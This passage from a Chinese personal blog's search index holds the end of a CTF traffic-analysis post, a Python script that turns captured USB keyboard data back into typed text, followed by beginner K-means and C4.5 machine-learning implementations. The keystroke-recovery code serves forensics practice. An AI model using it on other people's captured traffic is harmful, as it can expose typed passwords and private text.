class="string">'0'</span> <span class="keyword">and</span> line[<span class="number">1</span>]!=<span class="string">'2'</span>) <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">6</span>:<span class="number">8</span>]==<span class="string">"00"</span>:</span><br><span class="line">             <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">6</span>:<span class="number">8</span>] <span class="keyword">in</span> normalKeys.keys():</span><br><span class="line">            output += [[normalKeys[line[<span class="number">6</span>:<span class="number">8</span>]]],[shiftKeys[line[<span class="number">6</span>:<span class="number">8</span>]]]][line[<span class="number">1</span>]==<span class="string">'2'</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output += [<span class="string">'[unknown]'</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">keys.close()</span><br><span class="line"></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line">print(<span class="string">""</span>.join(output))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a=output.index(<span class="string">'&lt;DEL&gt;'</span>)</span><br><span class="line">        <span class="keyword">del</span> output[a]</span><br><span class="line">        <span class="keyword">del</span> output[a<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> output[i]==<span class="string">"&lt;CAP&gt;"</span>:</span><br><span class="line">            flag+=<span class="number">1</span></span><br><span class="line">            output.pop(i)</span><br><span class="line">            <span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span class="line">                flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> flag!=<span class="number">0</span>:</span><br><span class="line">            output[i]=output[i].upper()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">'output :'</span> + <span class="string">""</span>.join(output))</span><br></pre></td></tr></table></figure><h3 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h3><ul><li><a href="https://github.com/WangYihang/UsbMiceDataHacker" target="_blank" rel="noopener">UsbMiceDataHacker</a></li><li><a href="https://github.com/WangYihang/UsbKeyboardDataHacker" target="_blank" rel="noopener">UsbKeyboardDataHacker</a></li></ul><h2 id="拓展阅读-amp-参考页面"><a href="#拓展阅读-amp-参考页面" class="headerlink" title="拓展阅读&amp;参考页面"></a>拓展阅读&amp;参考页面</h2><p><a href="https://ctf-wiki.github.io/ctf-wiki/misc/traffic/protocols/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/misc/traffic/protocols/</a><br><a href="https://www.anquanke.com/post/id/85218" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85218</a></p>]]></content>
      
      
      <categories>
          
          <category> 杂物堆积 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 流量分析 </tag>
            
            <tag> usb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>K-means的python实现</title>
      <link href="/2018/04/13/%E4%BB%93%E5%BA%93%EF%BC%9AK-Means%E7%9A%84python%E5%AE%9E%E7%8E%B0/"/>
      <url>/2018/04/13/%E4%BB%93%E5%BA%93%EF%BC%9AK-Means%E7%9A%84python%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p><excerpt in index | 首页摘要><br>爆肝一天写完了，只是最基础的KM<br><a id="more"></a></excerpt></p><p><the rest of contents | 余下全文><br>思路还挺简单的可惜架不住我脑残（……）<br>判断相等的while有问题会多跑好多次，还在想怎么改<br>所用数据集：<br><a href="http://archive.ics.uci.edu/ml/machine-learning-databases/iris/iris.data" target="_blank" rel="noopener">http://archive.ics.uci.edu/ml/machine-learning-databases/iris/iris.data</a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding = utf-8</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">●K-means v1.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">作者：Kadoya</span></span><br><span class="line"><span class="string">创建日期：18.4.12</span></span><br><span class="line"><span class="string">最近修改时间：18.4.13</span></span><br><span class="line"><span class="string">程序目的：聚类</span></span><br><span class="line"><span class="string">主要算法说明：</span></span><br><span class="line"><span class="string">        1.随机选择k个数据点作为质心以分成k个分组</span></span><br><span class="line"><span class="string">        2.分别计算每个点离每个质心的欧几里得距离，选距离最小的分成一组</span></span><br><span class="line"><span class="string">        3.每组选出新的虚拟质心，这个质心不用落到具体的数据点上</span></span><br><span class="line"><span class="string">        4.再次计算每个点离新质心的欧几里得距离并重复以上步骤直至分组前后没有变化</span></span><br><span class="line"><span class="string">程序备注：</span></span><br><span class="line"><span class="string">        1.iris只有3和4，即花瓣宽度和花瓣长度对区分有用</span></span><br><span class="line"><span class="string">        2.雨血敢出敢买所以求你了快出（</span></span><br><span class="line"><span class="string">        3.想玩牧羊人之心！跪求公测！</span></span><br><span class="line"><span class="string">更新历史：</span></span><br><span class="line"><span class="string">        4.13 v1.0</span></span><br><span class="line"><span class="string">            ①基本功能完成，小bug不计其数，智障操作不计其数</span></span><br><span class="line"><span class="string">Attribute Information:</span></span><br><span class="line"><span class="string">   1. sepal length in cm</span></span><br><span class="line"><span class="string">   2. sepal width in cm</span></span><br><span class="line"><span class="string">   3. petal length in cm</span></span><br><span class="line"><span class="string">   4. petal width in cm</span></span><br><span class="line"><span class="string">   5. class: </span></span><br><span class="line"><span class="string">      -- Iris Setosa</span></span><br><span class="line"><span class="string">      -- Iris Versicolour</span></span><br><span class="line"><span class="string">      -- Iris Virginica</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stardust</span><span class="params">(data,k)</span>:</span><span class="comment">#基本处理  参数：原始数据，质心数</span></span><br><span class="line">    lost_star=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:<span class="comment">#只有3,4列有用所以[2:-1]</span></span><br><span class="line">        lost_star.append(i.strip(<span class="string">'\n'</span>).split(<span class="string">','</span>)[<span class="number">2</span>:<span class="number">-1</span>])</span><br><span class="line">    lost_star=[list(map(float,i)) <span class="keyword">for</span> i <span class="keyword">in</span> lost_star]<span class="comment">#str转为float</span></span><br><span class="line">    <span class="comment">#centroids=[random.choice(lost_star) for i in range(k)]</span></span><br><span class="line">    <span class="comment">#↑会选到重复的，老老实实展开写了</span></span><br><span class="line">    sss=lost_star[:]</span><br><span class="line">    centroids=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(k):<span class="comment">#随机选k个数据点作为质心</span></span><br><span class="line">        a=random.choice(sss)</span><br><span class="line">        sss.remove(a)</span><br><span class="line">        centroids+=[a]</span><br><span class="line">    <span class="keyword">return</span> lost_star,centroids  <span class="comment">#返回数据集和质心</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cost</span><span class="params">(lost_star,centroids)</span>:</span><span class="comment">#计算欧几里得距离并分组且返回新质心  参数：数据集list，质心list</span></span><br><span class="line">    scrap,new,puppet=&#123;&#125;,[],[]</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> range(len(lost_star)):<span class="comment">#遍历数据集里的点</span></span><br><span class="line">        star=&#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> centroids:<span class="comment">#计算该点和不同质点间的距离(cost)</span></span><br><span class="line">            cost=sum([pow(lost_star[s][j]-c[j],<span class="number">2</span>) <span class="keyword">for</span> j <span class="keyword">in</span> range(len(lost_star[s]))])</span><br><span class="line">            star[centroids.index(c)]=cost   <span class="comment">#key:value=质心id:数据点到该质心的距离</span></span><br><span class="line">        cen=[i <span class="keyword">for</span> i,j <span class="keyword">in</span> star.items() <span class="keyword">if</span> j == min(star.values())][<span class="number">0</span>]<span class="comment">#最近的质心的id</span></span><br><span class="line">        <span class="keyword">if</span> cen <span class="keyword">not</span> <span class="keyword">in</span> scrap.keys():<span class="comment">#分类，key:value=质心id:属于该质心的点的列表</span></span><br><span class="line">            scrap[cen]=[]</span><br><span class="line">        scrap[cen].append(s)</span><br><span class="line">        puppet.append(cen)<span class="comment">#这个才是！要传回去的列表！（</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> scrap.values():<span class="comment">#计算新的质心</span></span><br><span class="line">        n=[sum([lost_star[j][k] <span class="keyword">for</span> j <span class="keyword">in</span> i])/len(i) <span class="keyword">for</span> k <span class="keyword">in</span> range(len(lost_star[<span class="number">0</span>]))]</span><br><span class="line">        new.append(n)</span><br><span class="line">    <span class="keyword">return</span> puppet,new</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">kmeans</span><span class="params">(lost_star,centroids)</span>:</span><span class="comment">#参数：数据集，质心</span></span><br><span class="line">    puppet,new=cost(lost_star,centroids)</span><br><span class="line">    puppet2,new2=cost(lost_star,new)</span><br><span class="line">    <span class="keyword">while</span> puppet!=puppet2:<span class="comment">#分组前后不同的话就重来</span></span><br><span class="line">        puppet,new=cost(lost_star,new2)</span><br><span class="line">        puppet2,new2=cost(lost_star,new)</span><br><span class="line">    <span class="keyword">return</span> puppet,new</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">import</span> datetime</span><br><span class="line">    starttime = datetime.datetime.now()</span><br><span class="line"></span><br><span class="line">    path = <span class="string">r'data.txt'</span></span><br><span class="line">    <span class="keyword">with</span> open(path) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.readlines()</span><br><span class="line">    k=<span class="number">3</span></span><br><span class="line">    lost_star,centroids=stardust(data,k)<span class="comment">#拿到数据集和质心</span></span><br><span class="line">    puppet,new=kmeans(lost_star,centroids)</span><br><span class="line">    print(puppet,new)</span><br><span class="line">    </span><br><span class="line">    endtime = datetime.datetime.now()</span><br><span class="line">    <span class="keyword">print</span> (endtime - starttime)</span><br></pre></td></tr></table></figure></the></p><p>图像代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> matplotlib.colors <span class="keyword">import</span> ListedColormap</span><br><span class="line"><span class="keyword">from</span> kadoya <span class="keyword">import</span> *  <span class="comment">#kmeans算法的py文件名</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ori</span><span class="params">(lost_star,new,s,d)</span>:</span></span><br><span class="line">    plt.figure(<span class="number">1</span>)                <span class="comment"># 第一张图</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line">      <span class="keyword">if</span> s[i]==d[<span class="number">0</span>]:</span><br><span class="line">        plt.scatter(lost_star[i][<span class="number">0</span>],lost_star[i][<span class="number">1</span>],c = <span class="string">'r'</span>,marker = <span class="string">'o'</span>)</span><br><span class="line">      <span class="keyword">if</span> s[i]==d[<span class="number">1</span>]:</span><br><span class="line">        plt.scatter(lost_star[i][<span class="number">0</span>],lost_star[i][<span class="number">1</span>],c = <span class="string">'b'</span>,marker = <span class="string">'o'</span>)</span><br><span class="line">      <span class="keyword">if</span> s[i]==d[<span class="number">2</span>]:</span><br><span class="line">        plt.scatter(lost_star[i][<span class="number">0</span>],lost_star[i][<span class="number">1</span>],c = <span class="string">'g'</span>,marker = <span class="string">'o'</span>)</span><br><span class="line">    plt.title(<span class="string">'training set'</span>)</span><br><span class="line">    plt.figure(<span class="number">2</span>)                <span class="comment"># 第二张图</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(lost_star)):</span><br><span class="line">      <span class="keyword">if</span> int(star[i])==<span class="number">0</span>:</span><br><span class="line">        plt.scatter(lost_star[i][<span class="number">0</span>],lost_star[i][<span class="number">1</span>],c = <span class="string">'r'</span>,marker = <span class="string">'o'</span>)</span><br><span class="line">      <span class="keyword">if</span> int(star[i])==<span class="number">1</span>:</span><br><span class="line">        plt.scatter(lost_star[i][<span class="number">0</span>],lost_star[i][<span class="number">1</span>],c = <span class="string">'b'</span>,marker = <span class="string">'o'</span>)</span><br><span class="line">      <span class="keyword">if</span> int(star[i])==<span class="number">2</span>:</span><br><span class="line">        plt.scatter(lost_star[i][<span class="number">0</span>],lost_star[i][<span class="number">1</span>],c = <span class="string">'g'</span>,marker = <span class="string">'o'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(new)):</span><br><span class="line">        <span class="keyword">if</span> i==<span class="number">0</span>:</span><br><span class="line">            plt.scatter(new[i][<span class="number">0</span>],new[i][<span class="number">1</span>],c = <span class="string">'r'</span>,marker = <span class="string">'x'</span>)</span><br><span class="line">        <span class="keyword">if</span> i==<span class="number">1</span>:</span><br><span class="line">            plt.scatter(new[i][<span class="number">0</span>],new[i][<span class="number">1</span>],c = <span class="string">'b'</span>,marker = <span class="string">'x'</span>)</span><br><span class="line">        <span class="keyword">if</span> i==<span class="number">2</span>:</span><br><span class="line">            plt.scatter(new[i][<span class="number">0</span>],new[i][<span class="number">1</span>],c = <span class="string">'g'</span>,marker = <span class="string">'x'</span>)</span><br><span class="line">    plt.title(<span class="string">'test set'</span>)</span><br><span class="line">    plt.show()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    path = <span class="string">r'data.txt'</span></span><br><span class="line">    <span class="keyword">with</span> open(path) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.readlines()</span><br><span class="line">    k=<span class="number">3</span></span><br><span class="line">    lost_star,centroids=stardust(data,k)<span class="comment">#拿到数据集和质心</span></span><br><span class="line">    star,new=kmeans(lost_star,centroids)</span><br><span class="line"></span><br><span class="line">    s,d=[],[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        s.append(i.strip(<span class="string">'\n'</span>).split(<span class="string">','</span>)[<span class="number">-1</span>])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> d:</span><br><span class="line">            d.append(i)</span><br><span class="line">    ori(lost_star,new,s,d)</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> 杂物堆积 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C4.5的python实现</title>
      <link href="/2018/03/29/%E4%BB%93%E5%BA%93%EF%BC%9AC4-5%E7%9A%84python%E5%AE%9E%E7%8E%B0/"/>
      <url>/2018/03/29/%E4%BB%93%E5%BA%93%EF%BC%9AC4-5%E7%9A%84python%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p><excerpt in index | 首页摘要><br>尝试着写了一下，只是在重复造轮子而已<br><a id="more"></a></excerpt></p><p><the rest of contents | 余下全文><br>开始后的第三周，尝试着写了一点。<br>edit：于4月8日增加连续值处理，具体参见<a href="https://www.jianshu.com/p/f7219841916a" target="_blank" rel="noopener">https://www.jianshu.com/p/f7219841916a</a><br>edit：4月10日消减部分代码量<br>数据集如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">OUTLOOK TEMPERATURE HUMIDITY WINDY ACTIVATE</span><br><span class="line">sunny 85 85 weak no</span><br><span class="line">sunny 80 90 strong no</span><br><span class="line">overcast 83 78 weak yes</span><br><span class="line">rainy 70 96 weak yes</span><br><span class="line">rainy 68 80 weak yes</span><br><span class="line">rainy 65 70 strong no</span><br><span class="line">overcast 64 65 strong yes</span><br><span class="line">sunny 72 95 weak no</span><br><span class="line">sunny 69 70 weak yes</span><br><span class="line">rainy 75 80 weak yes</span><br><span class="line">sunny 75 70 strong yes</span><br><span class="line">overcast 72 90 strong yes</span><br><span class="line">overcast 81 75 weak yes</span><br><span class="line">rainy 71 80 strong no</span><br></pre></td></tr></table></figure></the></p><p>思路很迷，如果有谁不幸看到了这篇请不要当做参考会被带到沟里的……<br>有1点问题，关于max默认取第一个值……比如两个属性的信息增益率相等且都最大，取不同的属性作为节点会生成不同的树（。<br>所以该怎么办哦www</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding = utf-8</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">●C4.5 v1.1</span></span><br><span class="line"><span class="string">作者：Kadoya</span></span><br><span class="line"><span class="string">创建日期：18.3.24</span></span><br><span class="line"><span class="string">最近修改时间：18.4.10</span></span><br><span class="line"><span class="string">程序目的：一个树:D</span></span><br><span class="line"><span class="string">主要算法说明：</span></span><br><span class="line"><span class="string">        1.说白了（大概）就是权重排序，或者看下面这一堆废话也行。</span></span><br><span class="line"><span class="string">            读取文档→拿到属性→调stardust()拿到具体数据（列表）→</span></span><br><span class="line"><span class="string">            调continuous()处理连续值→调entropy()拿到结果熵（playgolf?）→</span></span><br><span class="line"><span class="string">            将数据集，属性和结果熵传入gotcha()，即用于找到下一个节点和子集的函数</span></span><br><span class="line"><span class="string">            ①如果结果是纯的或满足某种条件则return（对应书上第2~4行）</span></span><br><span class="line"><span class="string">            ②调gainratio()得到每个属性对应的信息增益率并排序，取最大的作为节点</span></span><br><span class="line"><span class="string">            ③生成基于该属性不同取值的不同子集，计算子集的结果熵并再次调用gotcha()（第11~14行）</span></span><br><span class="line"><span class="string">            返回tree并输出（第15行）</span></span><br><span class="line"><span class="string">        2.凑不齐三点了不管了x</span></span><br><span class="line"><span class="string">程序备注：</span></span><br><span class="line"><span class="string">        1.蜃楼啥时候上steam啊……</span></span><br><span class="line"><span class="string">        2.教授！！！来我迦了！！！毒针地狱.jpg 为了刷毒针正式移民乌鲁克……</span></span><br><span class="line"><span class="string">        3.一人血书医生早日实装（</span></span><br><span class="line"><span class="string">更新历史：</span></span><br><span class="line"><span class="string">        3.28 v1.0</span></span><br><span class="line"><span class="string">            ①基本功能完成，小bug不计其数，智障操作不计其数</span></span><br><span class="line"><span class="string">        4.8 update v1.05</span></span><br><span class="line"><span class="string">            ①增加连续值处理</span></span><br><span class="line"><span class="string">            ②可以引random达到增益率相同时的选择伪随机而非直接[0]选择第一个但是没改</span></span><br><span class="line"><span class="string">        4.10 update v1.1</span></span><br><span class="line"><span class="string">            ①连续值那里原本的int改了float，免得有小数</span></span><br><span class="line"><span class="string">            ②精简部分代码，纯代码部分压缩到80行</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">说实话上次好像说了有个bug要改，想不起来了（……</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stardust</span><span class="params">(data)</span>:</span><span class="comment">#具体数据,参数：读到的源文档</span></span><br><span class="line">    attributes=[]<span class="comment">#属性:outlook,temperature,humidity,windy之类</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data[<span class="number">0</span>].split(<span class="string">' '</span>)[<span class="number">0</span>:<span class="number">-1</span>]:<span class="comment">#最后一列是结果(play golf?)所以不算</span></span><br><span class="line">        attributes.append(i)          <span class="comment">#拿到所有属性</span></span><br><span class="line">    lost_star=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data[<span class="number">1</span>:]:<span class="comment">#第一行是说明所以不算，下一个.jpg</span></span><br><span class="line">        lost_star.append(i.strip(<span class="string">'\n'</span>).split(<span class="string">' '</span>)[<span class="number">0</span>:])<span class="comment">#删除换行符，以空格分割</span></span><br><span class="line">    lost_star=continuous(lost_star,<span class="number">1</span>)</span><br><span class="line">    lost_star=continuous(lost_star,<span class="number">2</span>)</span><br><span class="line">    en = entropy(lost_star,len(lost_star[<span class="number">0</span>])<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> attributes,lost_star,en</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_subset</span><span class="params">(lost_star,value,j)</span>:</span><span class="comment">#生成子集 参数：数据集，属性具体取值,所在列数</span></span><br><span class="line">    subset=[lost_star[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(lost_star)) <span class="keyword">if</span> lost_star[i][j]==value]</span><br><span class="line">    <span class="keyword">return</span> subset</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">continuous</span><span class="params">(lost_star,l)</span>:</span><span class="comment">#连续值的阈值 参数：数据集，连续值所在列数</span></span><br><span class="line">    <span class="comment">#不转float会出现15,7,89这种情况，大概是因为str先比第一位，大概。</span></span><br><span class="line">    gear=sorted(lost_star,key=<span class="keyword">lambda</span> st: float(st[l]))</span><br><span class="line">    <span class="comment">#可能的分割阈值点，!=是因为把取值相同的类分成不同的类没有意义</span></span><br><span class="line"><span class="comment">##    possible=[]</span></span><br><span class="line"><span class="comment">##    for i in range(len(lost_star)):</span></span><br><span class="line"><span class="comment">##        if lost_star[i][-1]!=lost_star[i+1][-1]:</span></span><br><span class="line"><span class="comment">##            possible+=[str((int(lost_star[i][l])+int(lost_star[i+1][l]))/2)]</span></span><br><span class="line"><span class="comment">##            print(possible)</span></span><br><span class="line">    possible=[str((float(gear[i][l])+float(gear[i+<span class="number">1</span>][l]))/<span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(len(gear)<span class="number">-1</span>) <span class="keyword">if</span> gear[i][<span class="number">-1</span>]!=gear[i+<span class="number">1</span>][<span class="number">-1</span>]]</span><br><span class="line">    scrap=&#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> possible:</span><br><span class="line">        subset1=[gear[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(gear)) <span class="keyword">if</span> float(gear[i][l])&lt;float(j)]<span class="comment">#小于该分割点的子集</span></span><br><span class="line">        subset2=[gear[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(gear)) <span class="keyword">if</span> float(gear[i][l])&gt;=float(j)]<span class="comment">#大于ry</span></span><br><span class="line">        scrap[j]=len(subset1)/len(lost_star)*entropy(subset1,<span class="number">-1</span>)+len(subset2)/len(lost_star)*entropy(subset2,<span 